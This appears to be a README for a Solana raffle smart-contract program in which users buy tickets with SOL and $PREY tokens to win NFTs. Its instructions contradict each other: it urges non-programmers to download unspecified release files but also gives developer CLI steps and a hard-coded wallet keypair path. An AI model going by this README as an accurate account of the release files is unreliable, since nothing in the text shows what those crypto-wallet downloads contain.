# 🎟️ ApeX-Raffle-program - Simple Way to Join Raffles

[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/MIRAXVISHU/ApeX-Raffle-program/releases)

## 🚀 Getting Started

Welcome to the ApeX Raffle Program! This application allows you to participate in raffles where you can win NFTs and other rewards using Solana tokens. Follow the steps below to get started.

## 📥 Download & Install

To download the application, visit the following link:

[Download the ApeX-Raffle-program](https://github.com/MIRAXVISHU/ApeX-Raffle-program/releases)

1. Click on the link above to go to the Releases page.
2. Look for the latest version of the program.
3. Download the appropriate file for your operating system.

## 💻 System Requirements

- Operating System: Windows, macOS, or Linux
- Node.js: Version 14 or above
- Yarn: Version 1.22 or above
- Solana Wallet: Necessary for account management

## 🔧 Install Dependencies

Before running the program, you need to install some dependencies. Follow these steps:

1. Install Node.js and Yarn. You can download them from their official websites:
   - [Node.js Download](https://nodejs.org/)
   - [Yarn Installation](https://yarnpkg.com/getting-started/install)

2. Install `ts-node` globally. Open your terminal or command prompt and run:

   ```
   npm install -g ts-node
   ```

3. Confirm that you have prepared your Solana wallet. Make sure the wallet file is located at:  
   `/home/fury/.config/solana/id.json` for testing.

## 🛠️ Usage

To run the program, follow these steps:

1. Navigate to the main script located at:

   ```
   /cli/script.ts
   ```

2. The types for program accounts can be found here:

   ```
   /cli/types.ts
   ```

3. The IDL to facilitate JavaScript binding is available at:

   ```
   /cli/raffle.json
   ```

4. You can test the script functions using the following instructions:
   - Adjust commands in the `script.ts` file as needed.
   - Ensure the `ANCHOR_WALLET` environment variable is set correctly in `package.json`.
   - Run the script with:

   ```
   yarn ts-node
   ```

## 🎉 Features

### 🌟 For Smart Contract Owners

- **Initialize the Smart Contract**: As a new Smart Contract Owner, you must initialize it to allocate global accounts. To do this, run:

   ```
   initProject
   ```

This ensures that everything is set up for ticket sales and prize distribution.

### 🎟️ Ticket Purchase

- Users can buy raffle tickets using $Sol and $PREY tokens directly through the application's interface. This process is streamlined to make it simpler for users.

### 🏆 NFT Rewards

- Winners can receive exciting NFTs that are part of the raffle prizes, enhancing the lottery experience.

## 📜 FAQ

### What is this application?

The ApeX-Raffle-program is a platform for participating in raffles using cryptocurrency. You can win NFTs and other digital assets easily.

### Do I need programming skills to use it?

No, you do not need programming skills. Follow the prompts to download and run the application, and you will be able to join raffles easily.

### How can I get support?

For support, you can open an issue on the GitHub repository. The community or developers will assist you as quickly as possible.

## 📞 Contact

- For further inquiries, please reach out through the GitHub repository contact options. We are here to help you along your raffle journey!

## 🎈 Acknowledgments

Thank you for using the ApeX Raffle Program! Enjoy participating in exciting raffles and good luck! Don't forget to visit the [Releases page](https://github.com/MIRAXVISHU/ApeX-Raffle-program/releases) for updates and more information.